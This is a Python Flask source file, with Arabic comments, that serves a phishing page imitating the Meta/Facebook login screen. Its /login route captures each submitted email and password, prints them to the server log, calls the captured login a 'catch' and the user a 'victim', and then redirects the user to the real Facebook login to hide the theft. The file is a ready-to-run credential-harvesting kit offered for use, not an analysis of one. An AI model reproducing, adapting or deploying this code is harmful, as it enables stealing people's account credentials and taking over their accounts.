from flask import Flask, request, render_template_string, redirect
import os

app = Flask(__name__)

# كود الصفحة اللي راهي فوطوكوبي
HTML_CODE = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تسجيل الدخول</title>
    <style>
        body { font-family: sans-serif; background: #000; color: white; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
        .top-container { width: 100%; text-align: right; padding: 15px; box-sizing: border-box; }
        .lang { color: #888; font-size: 14px; }
        .login-box { width: 90%; max-width: 400px; display: flex; flex-direction: column; align-items: center; }
        .show-all-photos { background: #333; color: white; padding: 10px 20px; border-radius: 20px; font-size: 14px; margin-bottom: 20px; border: none; }
        .input-group { width: 100%; margin-bottom: 12px; border: 1px solid #444; border-radius: 8px; padding: 10px; box-sizing: border-box; }
        input { width: 100%; background: transparent; border: none; color: white; font-size: 16px; outline: none; }
        .btn-blue { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 25px; font-size: 16px; font-weight: bold; margin-top: 10px; cursor: pointer; }
        .btn-outline { width: 85%; padding: 10px; background: transparent; color: #1877f2; border: 1px solid #1877f2; border-radius: 25px; font-size: 16px; font-weight: bold; position: absolute; bottom: 80px; text-decoration: none; text-align: center; }
        .footer { position: absolute; bottom: 20px; color: #888; }
    </style>
</head>
<body>
    <div class="top-container"><span class="lang">العربية</span></div>
    <div class="login-box">
        <button class="show-all-photos">عرض كل الصور</button>
        <form action="/login" method="post">
            <div class="input-group"><input type="text" name="email" placeholder="رقم الهاتف أو البريد الإلكتروني" required></div>
            <div class="input-group"><input type="password" name="password" placeholder="كلمة السر" required></div>
            <button type="submit" class="btn-blue">تسجيل الدخول</button>
        </form>
    </div>
    <a href="#" class="btn-outline">إنشاء حساب جديد</a>
    <div class="footer">Meta</div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_CODE)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # تسجيل الصيدة في السجلات
    print(f"\n🎯 صيدة جديدة جمرة:\n📧 الإيميل: {email}\n🔑 المودباس: {password}\n")
    
    # السحر هنا: يبعث الضحية لفيسبوك الحقيقي
    return redirect("https://www.facebook.com/login")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
